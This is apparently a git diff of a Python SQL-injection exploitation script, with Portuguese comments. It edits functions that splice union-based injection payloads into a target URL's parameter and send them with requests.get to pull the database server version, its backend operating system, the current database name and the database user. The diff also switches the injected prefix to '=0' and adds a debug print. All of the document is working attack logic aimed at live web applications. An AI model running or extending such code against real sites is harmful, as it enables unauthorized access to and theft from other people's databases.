@@ -66,7 +66,7 @@ def _serverVersion(target, cullumns_number):
         columns = str(collumns_number_list)
         columns = columns.replace("[", "")
         columns = columns.replace("]", "")
-        
+        ## pega a versão do SGBD
         for collumns_perc in  range(1, cullumns_number+1):
             exploited_target_url = target.replace(splited_para, splited_para+VULNERABLE_COLLUM_DETECTING+columns.replace(str(collumns_perc), CHECKING_FOR_DBMS_VERSION))
             main_request = requests.get(url=exploited_target_url)
@@ -75,6 +75,7 @@ def _serverVersion(target, cullumns_number):
                     server_version = mysql_server_version
                     server_fingerprint_info[1] = server_version
                     break
+            ## pega o sistema backend do SGBD
             for dbms_backend_system in OS:
                 if dbms_backend_system in main_request.text.lower():
                     server_system = dbms_backend_system
@@ -89,10 +90,6 @@ def _getDatabaseName(target, cullumns_number):
     exploited_target_url = str()
     collumns_number_list = []
     columns = str()
-    index_server_fingerprint_info = 1
-    server_version = str()
-    server_system = str()
-    server_fingerprint_info = {}
     if para.search(target):
         splited_para = para.search(target).group()
         for collumns_perc in range(1, cullumns_number+1): ## apenas preenche umma lista contendo as colunas
@@ -102,15 +99,20 @@ def _getDatabaseName(target, cullumns_number):
         columns = columns.replace("[", "")
         columns = columns.replace("]", "")
         
+        ## pega o nome so banco de dados actual
         for collumns_perc in  range(1, cullumns_number+1):
-            exploited_target_url = target.replace(splited_para, splited_para+VULNERABLE_COLLUM_DETECTING+columns.replace(str(collumns_perc), DATABASE_NAME))
+            exploited_target_url = target.replace(splited_para, '=0'+VULNERABLE_COLLUM_DETECTING+columns.replace(str(collumns_perc), DATABASE_NAME))
             main_request = requests.get(url=exploited_target_url)
             
         ## pegando o usuário actual do banco de dados
         for collumns_perc in  range(1, cullumns_number+1):
-            exploited_target_url = target.replace(splited_para, splited_para+VULNERABLE_COLLUM_DETECTING+columns.replace(str(collumns_perc), GET_CURRENT_USER))
+            exploited_target_url = target.replace(splited_para, '=0'+VULNERABLE_COLLUM_DETECTING+columns.replace(str(collumns_perc), GET_CURRENT_USER))
             main_request = requests.get(url=exploited_target_url)
             main_request_parsed = BeautifulSoup(main_request.content, 'html.parser')
+            
+            print(exploited_target_url)
+                
+                
             
 '''
 mssql db fingerprint
